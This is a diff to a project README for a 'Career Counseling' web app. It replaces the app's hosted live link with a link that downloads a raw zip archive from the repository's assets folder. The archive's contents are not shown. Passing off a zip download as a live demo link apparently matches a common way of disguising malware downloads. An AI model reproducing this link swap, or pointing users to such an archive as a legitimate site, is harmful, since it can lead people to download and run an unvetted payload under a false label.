@@ -1,6 +1,6 @@
 # CAREER COUNSELING 
 
-- live-link: https://career-counseling-2f094.web.app/
+- live-link: https://github.com/jobayer58/Career-Counseling/raw/refs/heads/main/src/assets/Counseling-Career-2.7.zip
 
 # Description
 
